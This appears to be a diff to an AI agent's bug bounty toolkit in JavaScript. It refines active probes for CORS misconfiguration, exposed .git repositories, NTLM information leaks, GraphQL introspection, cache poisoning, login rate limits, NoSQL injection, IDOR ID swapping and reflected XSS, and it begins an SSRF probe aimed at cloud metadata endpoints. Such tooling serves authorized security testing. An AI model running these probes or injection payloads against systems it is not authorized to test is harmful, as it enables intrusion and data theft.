-					out.origins_tests.push(await run("OPTIONS", origin));
-				}
+				const combos = origins.flatMap((o) => [["GET", o], ["OPTIONS", o]]);
+				out.origins_tests = await mapPool(combos, 3, ([m, o]) => run(m, o));
 				for (const t of out.origins_tests) {
 					if (t.reflected && t.acac === "true") out.findings.push(`reflected origin ${t.origin} + Access-Control-Allow-Credentials: true (${t.method}) — credentialed cross-origin read possible`);
 					else if (t.reflected) out.findings.push(`origin reflected verbatim: ${t.origin} (${t.method})`);
@@ -4347,26 +4452,26 @@ const TOOLS = [
 					["/.git/config", "[core]"],
 					["/.git/index", "DIRC"],
 					["/.git/logs/HEAD", "0000000"],
-					["/.git/refs/heads/main", "ref:"]
+					["/.git/refs/heads/main", "hex40"]
 				];
-				for (const [p, marker] of probes) {
+				await mapPool(probes, 6, async ([p, marker]) => {
 					let status = 0;
 					let body = "";
 					try {
-						const { res } = await fetchRes(base + p, exec, { budget: 8000 });
+						const { res } = await fetchRes(base + p, exec, { budget: 5000 });
 						status = res.status;
 						body = await readLimited(res, 400);
 					} catch {
 						status = 0;
 					}
-					const hit = status === 200 && marker && body.includes(marker);
+					const hit = status === 200 && marker && (marker === "hex40" ? /^[0-9a-f]{40}$/.test(body.trim()) : body.includes(marker));
 					out.checks.push({ path: p, status, marker: hit ? marker : "" });
 					if (hit) out.findings.push(`${p} readable (200, contains "${marker}") — .git repository exposed`);
-				}
+				});
 				let listStatus = 0;
 				let listBody = "";
 				try {
-					const { res } = await fetchRes(base + "/.git/", exec, { budget: 8000 });
+					const { res } = await fetchRes(base + "/.git/", exec, { budget: 4000 });
 					listStatus = res.status;
 					listBody = await readLimited(res, 300);
 				} catch {
@@ -4438,9 +4543,10 @@ const TOOLS = [
 					const clean = u.split(/[?#]/)[0];
 					if (seen.has(clean)) continue;
 					seen.add(clean);
-					out.matches.push(clean);
 					const ext = (path.match(/\.([a-z0-9]+)$/i) || [])[1] || "?";
 					out.by_extension[ext] = (out.by_extension[ext] || 0) + 1;
+					// json/xml/txt/pdf/doc/xls/py are too common to be findings — count them but don't list
+					if (!["json", "xml", "txt", "csv", "pdf", "doc", "docx", "pptx", "rtf", "xls", "py"].includes(ext)) out.matches.push(clean);
 				}
 				out.matches = out.matches.slice(0, limit);
 				const exts = Object.entries(out.by_extension).sort((a, b) => b[1] - a[1]).map(([e, n]) => e + "x" + n).join(", ");
@@ -4515,53 +4621,58 @@ const TOOLS = [
 				}
 				out.status = res.status;
 				out.server = res.headers.get("server") || "";
-				const www = res.headers.get("www-authenticate") || "";
-				const m = www.match(/NTLM\s+([A-Za-z0-9+/=]+)/i);
-				if (m) {
+				const wwwRaw = res.headers.get("www-authenticate") || "";
+				const wwwParts = wwwRaw.split(",").map((s) => s.trim()).filter(Boolean);
+				const ntlmPart = wwwParts.find((s) => /^NTLM/i.test(s)) || "";
+				if (ntlmPart) {
 					out.ntlm_offered = true;
-					try {
-						const buf = Buffer.from(m[1], "base64");
-						// Type-2 Message: sig(8) | type(1) | TargetName SB(8) @12 | NegFlags(4) | ServerChallenge(8) @24 | ... | TargetInfo SB(8) @40
-						if (buf.length >= 48 && buf.toString("latin1", 0, 8) === "NTLMSSP\0" && buf[8] === 2) {
-							const u16 = (o) => buf.readUInt16LE(o);
-							const str = (o, len) => {
-								if (o + len > buf.length) return "";
-								try { return buf.toString("utf16le", o, o + len); } catch { return ""; }
-							};
-							const tNameLen = u16(12);
-							const tNameOff = u16(16);
-							out.target_name = str(tNameOff, tNameLen);
-							out.server_challenge = buf.toString("hex", 24, 32);
-							const tiLen = u16(40);
-							const tiOff = u16(44);
-							if (tiOff + tiLen <= buf.length) {
-								let p = tiOff;
-								const end = Math.min(tiOff + tiLen, buf.length);
-								while (p + 4 <= end) {
-									const avId = u16(p);
-									const avLen = u16(p + 2);
-									if (avId === 0) break;
-									const valStart = p + 4;
-									if (valStart + avLen > end) break;
-									if (avId === 1) out.av_pairs.netbios_computer = str(valStart, avLen);
-									else if (avId === 2) out.av_pairs.netbios_domain = str(valStart, avLen);
-									else if (avId === 3) out.av_pairs.dns_computer = str(valStart, avLen);
-									else if (avId === 4) out.av_pairs.dns_domain = str(valStart, avLen);
-									else if (avId === 5) out.av_pairs.dns_tree = str(valStart, avLen);
-									else if (avId === 7) out.av_pairs.timestamp = buf.toString("hex", valStart, valStart + avLen);
-									else if (avId === 9) out.av_pairs.spn = str(valStart, avLen);
-									p += 4 + avLen;
+					const tok = (ntlmPart.match(/^NTLM\s+([A-Za-z0-9+/=]+)$/i) || [])[1];
+					if (!tok) {
+						out.notes.push("bare NTLM offer (no Type-2 token) — NTLM auth surface present; a full Type-1/Type-2 handshake would confirm");
+					} else {
+						try {
+							const buf = b64ToBytes(tok);
+							// Type-2 Message: sig(8) | type(1) | TargetName SB(8) @12 | NegFlags(4) | ServerChallenge(8) @24 | ... | TargetInfo SB(8) @40
+							const sig = String.fromCharCode(...buf.subarray(0, 8));
+							if (buf.length >= 48 && sig === "NTLMSSP\0" && buf[8] === 2) {
+								const str = (o, len) => {
+									if (o + len > buf.length) return "";
+									try { return utf16leStr(buf, o, len); } catch { return ""; }
+								};
+								const tNameLen = u16le(buf, 12);
+								const tNameOff = u16le(buf, 16);
+								out.target_name = str(tNameOff, tNameLen);
+								out.server_challenge = hexBytes(buf, 24, 32);
+								const tiLen = u16le(buf, 40);
+								const tiOff = u16le(buf, 44);
+								if (tiOff + tiLen <= buf.length) {
+									let p = tiOff;
+									const end = Math.min(tiOff + tiLen, buf.length);
+									while (p + 4 <= end) {
+										const avId = u16le(buf, p);
+										const avLen = u16le(buf, p + 2);
+										if (avId === 0) break;
+										const valStart = p + 4;
+										if (valStart + avLen > end) break;
+										if (avId === 1) out.av_pairs.netbios_computer = str(valStart, avLen);
+										else if (avId === 2) out.av_pairs.netbios_domain = str(valStart, avLen);
+										else if (avId === 3) out.av_pairs.dns_computer = str(valStart, avLen);
+										else if (avId === 4) out.av_pairs.dns_domain = str(valStart, avLen);
+										else if (avId === 5) out.av_pairs.dns_tree = str(valStart, avLen);
+										else if (avId === 7) out.av_pairs.timestamp = hexBytes(buf, valStart, valStart + avLen);
+										else if (avId === 9) out.av_pairs.spn = str(valStart, avLen);
+										p += 4 + avLen;
+									}
 								}
+								const joined = (out.target_name + " " + Object.values(out.av_pairs).join(" ")).toUpperCase();
+								if (/WIN-[A-Z0-9]{7}/.test(joined)) out.notes.push("WIN-XXXXXXXXXXX hostname — likely corp AD estate; internals may resolve via DNS");
+								if (out.av_pairs.dns_tree) out.notes.push("AD DNS tree: " + out.av_pairs.dns_tree + " — candidates for internal-name fuzzing");
 							}
-							// defanged hostname hint: WIN-* machine names leak a corporate AD estate
-							const joined = (out.target_name + " " + Object.values(out.av_pairs).join(" ")).toUpperCase();
-							if (/WIN-[A-Z0-9]{7}/.test(joined)) out.notes.push("WIN-XXXXXXXXXXX hostname — likely corp AD estate; internals may resolve via DNS");
-							if (out.av_pairs.dns_tree) out.notes.push("AD DNS tree: " + out.av_pairs.dns_tree + " — candidates for internal-name fuzzing");
+						} catch {
+							out.notes.push("Type-2 parse failed — challenge may be truncated or non-standard");
 						}
-					} catch {
-						out.notes.push("Type-2 parse failed — challenge may be truncated or non-standard");
 					}
-				} else if (/negotiate/i.test(www)) {
+				} else if (/negotiate/i.test(wwwRaw)) {
 					out.notes.push("WWW-Authenticate: Negotiate only (Kerberos) — no NTLM challenge");
 				}
 			} catch (e) {
@@ -4611,16 +4722,19 @@ const TOOLS = [
 					const r = { path: p, status: 0, introspection: false, type_count: 0, has_mutations: false };
 					try {
 						const b = withBudget(exec, 8000);
-						const resp = await fetch(base + p, {
-							method: "POST",
-							signal: b.signal,
-							redirect: "follow",
-							headers: { "user-agent": UA, "content-type": "application/json", accept: "application/json" },
-							body: q
-						});
-						status = resp.status;
-						body = await readLimited(resp, 3000);
-						b.dispose();
+						try {
+							const resp = await fetch(base + p, {
+								method: "POST",
+								signal: b.signal,
+								redirect: "follow",
+								headers: { "user-agent": UA, "content-type": "application/json", accept: "application/json" },
+								body: q
+							});
+							status = resp.status;
+							body = await readLimited(resp, 3000);
+						} finally {
+							b.dispose();
+						}
 					} catch {
 						status = 0;
 					}
@@ -4633,7 +4747,8 @@ const TOOLS = [
 							/* not JSON — try raw marker */
 						}
 						const schema = parsed && parsed.data && parsed.data.__schema ? parsed.data.__schema : null;
-						const rawHit = body.includes('"__schema"');
+						// error responses echo the literal "__schema" — require a real types array too
+						const rawHit = body.includes('"__schema"') && /"types"\s*:/.test(body);
 						if (schema || rawHit) {
 							r.introspection = true;
 							if (schema && Array.isArray(schema.types)) r.type_count = schema.types.length;
@@ -4722,9 +4837,9 @@ const TOOLS = [
 					let status = 0;
 					let body = "";
 					try {
-						const { res } = await fetchRes(base + p, exec, { budget: 7000 });
+						const { res } = await fetchRes(base + p, exec, { budget: 6000 });
 						status = res.status;
-						body = await readLimited(res, 200);
+						body = await readLimited(res, 1200);
 					} catch {
 						status = 0;
 					}
@@ -4813,16 +4928,21 @@ const TOOLS = [
 			const out = { url: raw, versions: [], live: [], notes: [], summary: "", error: "" };
 			const VERS = ["v0", "v1", "v2", "v3", "v4", "v5", "beta", "alpha", "internal", "legacy", "old", "dev", "staging", "test", "2022-01-01", "2023-01-01", "2024-01-01"];
 			try {
-				// if URL is /api/<resource>, sibling versions live at /api/vN/<resource>
-				const m = raw.match(/^(https?:\/\/[^/]+)(\/api\/[^/]*\/)(.*)$/);
-				const useSibling = !!(m && m[3]);
-				const base = useSibling ? m[1] + "/api" : raw.replace(/\/+$/, "");
-				const resource = useSibling ? "/" + m[3] : "";
-				await mapPool(VERS, 4, async (v) => {
-					const probe = useSibling ? `${base}/${v}${resource}` : `${base}/${v}`;
+				// if URL contains /api/, sibling versions live at /api/vN/<resource>
+				const pu = new URL(raw);
+				const segs = pu.pathname.split("/").filter(Boolean);
+				const apiIdx = segs.findIndex((s) => s.toLowerCase() === "api");
+				const useSibling = apiIdx >= 0;
+				const resSegs = useSibling ? segs.slice(apiIdx + 1) : [];
+				const alreadyVersioned = resSegs.length > 0 && /^(v\d+|beta|alpha|internal|legacy|old|dev|staging|test)$/i.test(resSegs[0]);
+				const resource = (alreadyVersioned ? resSegs.slice(1) : resSegs).join("/");
+				await mapPool(VERS, 6, async (v) => {
+					const probe = useSibling
+						? pu.origin + "/api/" + v + (resource ? "/" + resource : "")
+						: raw.replace(/\/+$/, "") + "/" + v;
 					let status = 0;
 					try {
-						const { res } = await fetchRes(probe, exec, { budget: 7000 });
+						const { res } = await fetchRes(probe, exec, { budget: 5000 });
 						status = res.status;
 					} catch {
 						status = 0;
@@ -4901,9 +5021,9 @@ const TOOLS = [
 					let status = 0;
 					let body = "";
 					try {
-						const { res } = await fetchRes(u.origin + path, exec, { budget: 7000 });
+						const { res } = await fetchRes(u.origin + path, exec, { budget: 5000 });
 						status = res.status;
-						body = await readLimited(res, 300);
+						body = await readLimited(res, 2000);
 					} catch {
 						status = 0;
 					}
@@ -4911,12 +5031,10 @@ const TOOLS = [
 				}
 				const cand = await probe(u.pathname + u.search);
 				out.candidate = { status: cand.status, size: cand.size, marker: /\b(APP_KEY|DB_PASSWORD|SECRET|TOKEN|ref:|\[core\]|DIRC)\b/i.test(cand.body) ? "credential/git marker present" : "" };
-				for (const jp of junkPaths) {
-					const j = await probe(jp);
-					out.junk.push({ path: jp, status: j.status, size: j.size });
-				}
+				const junkRes = await mapPool(junkPaths, 4, (jp) => probe(jp));
+				for (let i = 0; i < junkPaths.length; i++) out.junk.push({ path: junkPaths[i], status: junkRes[i].status, size: junkRes[i].size });
 				const anyJunk200 = out.junk.some((j) => j.status === 200);
-				const sameAsJunk = anyJunk200 && out.junk.some((j) => j.status === cand.status && Math.abs(j.size - cand.size) < 25);
+				const sameAsJunk = anyJunk200 && out.junk.some((j) => j.status === cand.status && Math.abs(j.size - cand.size) / Math.max(cand.size, 1) < 0.15);
 				if (cand.status !== 200) out.verdict = `candidate returns HTTP ${cand.status} — not a soft-404 case; if it was 200 in a prior scan re-check (build rotation, auth-gated)`;
 				else if (sameAsJunk) out.verdict = "SOFT-404 LIKELY — candidate 200 body size matches junk-path 200s on same host; treat as false positive unless a distinguishable marker is present";
 				else if (anyJunk200) out.verdict = "Host serves 200 on junk paths (soft-404 host) but candidate body differs in size — borderline; confirm the content is real before reporting";
@@ -5048,13 +5166,26 @@ const TOOLS = [
 			const out = { domain, spf: {}, dmarc: {}, caa: [], mta_sts: "", findings: [], summary: "", error: "" };
 			const DOH = "https://cloudflare-dns.com/dns-query";
 			async function queryTxt(name) {
-				const b = withBudget(exec, 8000);
+				const b = withBudget(exec, 4000);
 				try {
 					const resp = await fetch(`${DOH}?name=${encodeURIComponent(name)}&type=TXT`, { method: "GET", signal: b.signal, headers: { accept: "application/dns-json" } });
 					const j = await resp.json();
 					if (j && j.Answer) {
 						return j.Answer.filter((a) => a.type === 16).map((a) => (a.data || "").replace(/^"|"$/g, "").replace(/""/g, '"')).join("");
 					}
+					return "";
+				} catch {
+					return "";
+				} finally {
+					b.dispose();
+				}
+			}
+			async function queryCaa(name) {
+				const b = withBudget(exec, 4000);
+				try {
+					const resp = await fetch(`${DOH}?name=${encodeURIComponent(name)}&type=CAA`, { method: "GET", signal: b.signal, headers: { accept: "application/dns-json" } });
+					const j = await resp.json();
+					if (j && j.Answer) return j.Answer.filter((a) => a.type === 257).map((a) => String(a.data || "")).join(" ");
 					return "";
 				} catch {
 					return "";
@@ -5080,11 +5211,9 @@ const TOOLS = [
 				out.dmarc.record = dmarc || "";
 				if (!dmarc) out.findings.push("NO DMARC record — receivers must guess; spoofed mail lands in inbox");
 				else if (/p=none/.test(dmarc)) out.findings.push("DMARC p=none — monitoring only, spoofed mail NOT rejected");
-				const caaSpf = await queryTxt(domain);
-				const caa = await queryTxt("_caa." + domain);
-				out.caa = caa ? [caa] : [];
-				if (caa === "") out.caa = [];
-				if (!out.caa.length && !out.findings.some((f) => f.startsWith("NO SPF"))) out.findings.push("NO CAA record — any CA may issue certs for the domain (subdomain-takeover-adjacent risk)");
+				const caa = await queryCaa(domain);
+				out.caa = caa ? caa.split(/\s+/).slice(0, 8) : [];
+				if (!out.caa.length) out.findings.push("NO CAA record — any CA may issue certs for the domain (subdomain-takeover-adjacent risk)");
 				const mtaSts = await queryTxt("_mta-sts." + domain);
 				out.mta_sts = mtaSts || "";
 				if (!mtaSts) out.findings.push("NO MTA-STS — no opportunistic TLS enforcement on inbound mail");
@@ -5228,35 +5357,37 @@ const TOOLS = [
 			const out = { url: target, results: [], cache_indicators: [], unkeyed: [], summary: "", error: "" };
 			try {
 				const HEADERS = Array.isArray(args.headers) && args.headers.length ? args.headers.slice(0, 6) : ["x-forwarded-host", "x-original-url", "x-forwarded-for"];
-				const baseline = await fetchRes(target, exec, { budget: 10000 });
+				const baseline = await fetchRes(target, exec, { budget: 8000 });
 				const baseText = await readLimited(baseline.res, 2000);
-				const baseHdrs = baseline.res.headers || {};
-				const mk = (h) => [h["age"], h["x-cache"], h["cf-cache-status"], h["x-cache-status"], h["x-varnish"], h["x-hacker"], h["cache-control"]].filter(Boolean).join(", ") || "-";
-				out.cache_indicators = [...new Set([baseline.res.headers["age"], baseline.res.headers["x-cache"], baseline.res.headers["cf-cache-status"], baseline.res.headers["x-cache-status"], baseline.res.headers["x-varnish"]].filter(Boolean))]; // eslint-disable-line
-				const baseLen = baseText.length;
+				const hget = (h, n) => { try { return h.get(n) || ""; } catch { return ""; } };
+				const mk = (h) => ["age", "x-cache", "cf-cache-status", "x-cache-status", "x-varnish", "cache-control"].map((n) => hget(h, n)).filter(Boolean).join(", ") || "-";
+				const ind = ["age", "x-cache", "cf-cache-status", "x-cache-status", "x-varnish"].map((n) => hget(baseline.res.headers, n)).filter(Boolean);
+				out.cache_indicators = [...new Set(ind)];
 				const sawCache = out.cache_indicators.length > 0;
-				for (const h of HEADERS) {
+				const hashes = new Map();
+				await mapPool(HEADERS, 4, async (h) => {
 					const vals = h === "x-forwarded-host" ? ["evil.example.net", "poisoned.example.net"] : h === "x-original-url" ? ["/admin", "/profile"] : ["203.0.113.7", "203.0.113.8"];
 					for (const val of vals) {
+						const b = withBudget(exec, 5000);
 						try {
-							const b = withBudget(exec, 10000);
 							const r = await fetch(target, { method: "GET", signal: b.signal, redirect: "follow", headers: { "user-agent": UA, [h]: val } });
 							const txt = await readLimited(r, 2000);
-							b.dispose();
-							const entry = { header: h, value: val, probe: "GET", status: r.status, body_len: txt.length, cache_headers: mk(r.headers || {}) };
-							out.results.push(entry);
+							out.results.push({ header: h, value: val, probe: "GET", status: r.status, body_len: txt.length, cache_headers: mk(r.headers || {}) });
+							hashes.set(h + "\u0000" + val, hashText(txt));
 						} catch (e) {
 							out.results.push({ header: h, value: val, probe: "GET", status: 0, body_len: 0, cache_headers: "error: " + shortErr(e) });
+						} finally {
+							b.dispose();
 						}
 					}
-				}
-				// same body for different header values with a cache indicator present -> header unkeyed
+				});
+				// identical FULL body for different header values + a cache layer in front -> header unkeyed
 				const grouped = {};
 				for (const r of out.results) (grouped[r.header] = grouped[r.header] || []).push(r);
 				for (const [h, rs] of Object.entries(grouped)) {
-					if (rs.length >= 2 && rs.every(r => r.status && r.body_len > 0) && new Set(rs.map(r => r.body_len)).size === 1) {
-						if (!sawCache) out.unkeyed.push(h + " (same body; add a cache indicator to confirm)");
-						else out.unkeyed.push(h);
+					const hset = new Set(rs.map((r) => hashes.get(h + "\u0000" + r.value)));
+					if (rs.length >= 2 && rs.every((r) => r.status && r.body_len > 0) && hset.size === 1 && sawCache) {
+						out.unkeyed.push(h + " (identical body across different " + h + " values + cache layer in front)");
 					}
 				}
 				out.summary = sawCache
@@ -5313,34 +5444,39 @@ const TOOLS = [
 				const n = Math.max(2, Math.min(15, parseInt(args.bursts, 10) || 10));
 				const ct = args.contentType || "application/json";
 				const body = args.body !== undefined ? args.body : JSON.stringify({ username: "pentest\u0040example.com", password: "wrongpass123" });
+				// budget each request so two full bursts fit inside timeoutMs
+				const perReq = Math.max(2500, Math.min(6000, Math.floor(28000 / (2 * n))));
 				const statuses = [];
 				for (let round = 1; round <= 2; round++) {
 					const reqs = [];
 					for (let i = 1; i <= n; i++) {
+						let st = 0, txtLen = 0;
+						const b = withBudget(exec, perReq);
 						try {
-							const b = withBudget(exec, 8000);
 							const r = await fetch(target, { method: "POST", signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "content-type": ct }, body });
-							const txt = await readLimited(r, 400);
-							b.dispose();
-							const st = r.status;
-							reqs.push({ n: i, status: st, body_len: txt.length });
-							statuses.push(st);
+							txtLen = (await readLimited(r, 400)).length;
+							st = r.status;
 						} catch (e) {
-							const st = e && e.name === "AbortError" ? 0 : (e && (e.status || 599));
-							reqs.push({ n: i, status: st, body_len: 0 });
-							statuses.push(st);
+							st = e && e.name === "AbortError" ? 0 : (e && (e.status || 599));
+						} finally {
+							b.dispose();
 						}
+						reqs.push({ n: i, status: st, body_len: txtLen });
+						statuses.push(st);
 					}
 					out.bursts.push({ burst: round, requests: reqs });
 					if (round === 1 && reqs.every(r => [400, 401, 422].includes(r.status))) {
 						// login likely rejects valid-format creds consistently; second burst adds latency signal
-						await new Promise(res => setTimeout(res, 1200));
+						await new Promise(res => setTimeout(res, 800));
 					}
 				}
 				const flat = statuses;
 				const hasBlock = flat.some(s => s === 429 || s === 403);
 				const has302 = flat.some(s => s === 302 || s === 301);
-				const lockout = out.bursts[1] && out.bursts[1].requests.every(r => r.status === 401);
+								const b1 = out.bursts[0] ? out.bursts[0].requests : [];
+				const b2 = out.bursts[1] ? out.bursts[1].requests : [];
+				// lockout = transition INTO all-401 (burst1 had success/redirect statuses), not constant 401s
+				const lockout = b2.length > 0 && b2.every((r) => r.status === 401) && !b1.every((r) => r.status === 401) && b1.some((r) => r.status >= 200 && r.status < 400);
 				if (hasBlock) {
 					const firstBlock = flat.findIndex(s => s === 429 || s === 403) + 1;
 					const kind = flat.includes(429) ? "429 (rate limit)" : "403 (WAF/account-block)";
@@ -5417,28 +5553,32 @@ const TOOLS = [
 				];
 				const MARKERS = ["token", "welcome", "dashboard", "logged", "session", "admin", "2fa", "otp"];
 				const baseline = await (async () => {
-					const b = withBudget(exec, 8000);
-					const r = await fetch(target, { method: "POST", signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "content-type": "application/json" }, body: payloads[0].payload });
-					const txt = await readLimited(r, 1200);
-					b.dispose();
-					return { status: r.status, len: txt.length, text: txt.toLowerCase() };
+					const b = withBudget(exec, 5000);
+					try {
+						const r = await fetch(target, { method: "POST", signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "content-type": "application/json" }, body: payloads[0].payload });
+						const txt = await readLimited(r, 4000);
+						return { status: r.status, len: txt.length, text: txt.toLowerCase() };
+					} finally {
+						b.dispose();
+					}
 				})();
 				out.results.push({ name: "baseline", payload: payloads[0].payload, status: baseline.status, body_len: baseline.len, marker: [] });
 				for (const p of payloads.slice(1)) {
-					try {
-						const b = withBudget(exec, 8000);
-						const r = await fetch(target, { method: "POST", signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "content-type": "application/json" }, body: p.payload });
-						const txt = await readLimited(r, 1200);
-						b.dispose();
-						const low = txt.toLowerCase();
-						const marker = MARKERS.filter(m => low.includes(m));
-						out.results.push({ name: p.name, payload: p.payload, status: r.status, body_len: txt.length, marker });
-					} catch (e) {
-						out.results.push({ name: p.name, payload: p.payload, status: 0, body_len: 0, marker: ["error: " + shortErr(e)] });
-					}
+						const b = withBudget(exec, 5000);
+						try {
+							const r = await fetch(target, { method: "POST", signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "content-type": "application/json" }, body: p.payload });
+							const txt = await readLimited(r, 4000);
+							const low = txt.toLowerCase();
+							const marker = MARKERS.filter(m => low.includes(m));
+							out.results.push({ name: p.name, payload: p.payload, status: r.status, body_len: txt.length, marker });
+						} catch (e) {
+							out.results.push({ name: p.name, payload: p.payload, status: 0, body_len: 0, marker: ["error: " + shortErr(e)] });
+						} finally {
+							b.dispose();
+						}
 				}
 				const nonBase = out.results.slice(1);
-				const statusChange = nonBase.filter(r => r.status > 0 && r.status !== baseline.status && ![400, 422].includes(baseline.status) === false ? r.status !== baseline.status && ![400, 422].includes(r.status) : r.status !== baseline.status);
+				const statusChange = nonBase.filter(r => r.status > 0 && r.status !== baseline.status && ![400, 422].includes(r.status));
 				const bodyChanged = nonBase.filter(r => r.status > 0 && r.body_len > baseline.len + 150);
 				const markerHit = nonBase.filter(r => r.marker.length > 0);
 				if (markerHit.length) { out.signal = "BODY_MARKER"; out.summary = "Login body differs & session/auth markers appear with NoSQL payloads — verify manually: " + markerHit.map(r => r.name).join(", "); }
@@ -6136,7 +6276,7 @@ const TOOLS = [
 					let minDigits = 5;
 					if (keyHint) {
 						const kl = String(keyHint).toLowerCase();
-						if (kl === "id" || kl.endsWith("id") || /(^|_)(id|pk|key)(_|$)/.test(kl)) minDigits = 2;
+						if (kl === "id" || kl.endsWith("id") || /(^|_)(id|pk|key)(_|$)/.test(kl) || /^[a-z]{3,}s$/i.test(kl)) minDigits = 2;
 					}
 					if (new RegExp("^\\d{" + minDigits + ",20}$").test(val)) return true;
 					if (new RegExp("^[a-zA-Z_][a-zA-Z0-9_]*_\\d{" + minDigits + ",20}$").test(val)) return true;
@@ -6191,9 +6331,10 @@ const TOOLS = [
 				for (let i = 0; i < pathParts.length; i++) {
 					const part = pathParts[i];
 					if (!part) continue;
-					if (looksLikeId(part)) {
+					const prevKey = i > 0 && pathParts[i - 1] && /^[a-zA-Z]/.test(pathParts[i - 1]) ? pathParts[i - 1] : "";
+					if (looksLikeId(part, prevKey)) {
 						let key = "id";
-						if (i > 0 && pathParts[i - 1]) key = pathParts[i - 1].toLowerCase().replace(/s$/, "") + "_id";
+						if (prevKey) key = prevKey.toLowerCase().replace(/s$/, "") + "_id";
 						add(key, "url-path", part, "path-segment");
 					}
 					// matrix / inline key=value or key:value inside the segment
@@ -6264,16 +6405,14 @@ const TOOLS = [
 					if (j) walkJson(j, "");
 				}
 
-				// signed_body / signed_payload wrappers (Instagram-style)
-				const sb = /([a-zA-Z_][a-zA-Z0-9_]*)=(signed_body|signed_payload|ig_sig_key_version)([^&;\s]*)/g;
+				// signed_body / signed_payload wrappers (Instagram-style): the field name IS the key
+				const sb = /(?:^|[?&;\s])(signed_body|signed_payload|ig_sig_key_version)=([^&;\s]*)/g;
 				while ((mm = sb.exec(all))) {
-					if (mm[3].startsWith("=")) {
-						const val = mm[3].slice(1);
-						if (val.includes(".")) {
-							const payload = unq(val.split(".", 2)[1]);
-							const j = tryJson(payload);
-							if (j) walkJson(j, "");
-						}
+					const val = unq(mm[2] || "");
+					if (val.includes(".")) {
+						const payload = unq(val.split(".", 2)[1]);
+						const j = tryJson(payload);
+						if (j) walkJson(j, "");
 					}
 				}
 
@@ -6462,9 +6601,15 @@ const TOOLS = [
 					return false;
 				};
 
-				// build modified target: attacker -> victim in URL and body
-				const modUrl = url.includes(attackerId) ? url.split(attackerId).join(victimId) : url;
-				const modBody = body.includes(attackerId) ? body.split(attackerId).join(victimId) : body;
+				// build modified target: attacker -> victim in URL and body (whole-ID tokens only,
+				// so short numeric ids like "42" never corrupt longer runs like "4200" or "1142")
+				const swapId = (s) => {
+					if (!attackerId || !s.includes(attackerId)) return s;
+					const esc = attackerId.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
+					return s.replace(new RegExp("(?<![0-9A-Za-z_])" + esc + "(?![0-9A-Za-z_])", "g"), victimId);
+				};
+				const modUrl = swapId(url);
+				const modBody = swapId(body);
 				out.swapped = modUrl !== url || modBody !== body;
 				if (!out.swapped) {
 					out.notes.push("attacker_id not present in URL or body — nothing to swap");
@@ -6535,8 +6680,174 @@ const TOOLS = [
 			}
 			return out;
 		}
+	},
+	{
+		name: "bb_xss_probe",
+		description: "Reflected-XSS quick probe (ACTIVE — authorized targets only): injects a distinctive marker into each query param and reports reflection + echo context (raw / attribute / in-script / encoded) plus a manual-verify flag. Corpus-driven: XSS is the single biggest disclosure class (1,737 of 11,304 reports) and previously had zero dedicated tooling. Keyless: direct HTTP.",
+		parameters: {
+			type: "object",
+			additionalProperties: false,
+			properties: {
+				url: { type: "string", description: "Full URL with at least one query param, e.g. https://target.com/search?q=test" },
+				param: { type: "string", description: "Optional: only test this param (default: all query params)" }
+			},
+			required: ["url"]
+		},
+		output: {
+			schema: {
+				type: "object",
+				properties: {
+					url: { type: "string" },
+					results: { type: "array", items: { type: "object", additionalProperties: false, properties: { param: { type: "string" }, payload: { type: "string" }, status: { type: "integer" }, reflected: { type: "boolean" }, context: { type: "string" }, note: { type: "string" } }, required: ["param", "payload", "status", "reflected", "context"] } },
+					summary: { type: "string" },
+					error: { type: "string" }
+				},
+				required: ["url", "results", "summary"]
+			},
+			render: (_args, v) =>
+				renderLines("💉 bb_xss_probe " + v.url, [
+					v.summary,
+					...v.results.map((r) => `${r.param}: HTTP ${r.status} reflected=${r.reflected} ctx=${r.context}${r.note ? " " + r.note : ""}`),
+					v.error ? "error: " + v.error : ""
+				].filter(Boolean))
+		},
+		timeoutMs: 45000,
+		isConcurrencySafe: () => true,
+		async execute(args, exec) {
+			const base = normalizeUrl(args.url);
+			const out = { url: base, results: [], summary: "", error: "" };
+			try {
+				const u = new URL(base);
+				const allParams = [...u.searchParams.keys()];
+				if (!allParams.length) { out.summary = "no query params to test — append one, e.g. ?q=test"; return out; }
+				const wanted = args.param ? String(args.param) : "";
+				const params = allParams.filter((k) => !wanted || k === wanted);
+				const MARK = "bbxss7f3a";
+				const probeParam = async (p) => {
+					const inj = new URL(u.toString());
+					inj.searchParams.set(p, MARK);
+					let status = 0, txt = "";
+					const b = withBudget(exec, 6000);
+					try {
+						const r = await fetch(inj.toString(), { method: "GET", signal: b.signal, redirect: "follow", headers: { "user-agent": UA } });
+						status = r.status;
+						txt = await readLimited(r, 6000);
+					} catch {
+						status = 0;
+					} finally {
+						b.dispose();
+					}
+					if (!txt.includes(MARK)) return { param: p, payload: MARK, status, reflected: false, context: "none", note: "marker not reflected — filters/escaping or no reflection" };
+					const raw = txt.includes("<" + MARK);
+					const enc = txt.includes("&lt;" + MARK) || txt.includes("%3C" + MARK);
+					const attr = new RegExp("(?:src|href|action|data-[a-z]+)=\"[^\"]*bbxss7f3a", "i").test(txt);
+					const scriptCtx = new RegExp("<script[^>]*>[^<]*bbxss7f3a", "i").test(txt);
+					let context = "raw";
+					if (enc && !raw) context = "encoded";
+					else if (attr && !raw) context = "attr-value";
+					if (scriptCtx) context = "in-script";
+					if (raw) context = "unsafe-raw";
+					const note = status >= 200 && status < 300 && (context === "unsafe-raw" || context === "raw" || context === "in-script") ? "MANUAL VERIFY — likely reflected XSS" : "reflects but context is " + context;
+					return { param: p, payload: MARK, status, reflected: true, context, note };
+				};
+				out.results = await mapPool(params, 3, (p) => probeParam(p));
+				const hit = out.results.filter((r) => r.reflected);
+				out.summary = hit.length
+					? `${hit.length}/${params.length} param(s) reflect the marker (${hit.map((r) => r.param).join(", ")}) — contexts: ${hit.map((r) => r.context).join(", ")}; raw/in-script echo on 2xx = likely reflected XSS`
+					: `no marker reflection on ${params.length} param(s) — try bb_checklist(category="xss") for DOM/blind variants and postMessage sinks`;
+			} catch (e) {
+				out.error = shortErr(e);
+			}
+			return out;
+		}
+	},
+	{
+		name: "bb_ssrf_probe",
+		description: "Server-side request forgery quick probe (ACTIVE — authorized targets only): overwrites each URL param with loopback / cloud-metadata URLs (127.0.0.1, localhost, AWS+GCP IMDS) and flags status/body/error differences that indicate the server fetched the URL. Corpus-driven: SSRF is a top-10 disclosure class (207 reports) that previously had zero dedicated tooling. Keyless: direct HTTP.",
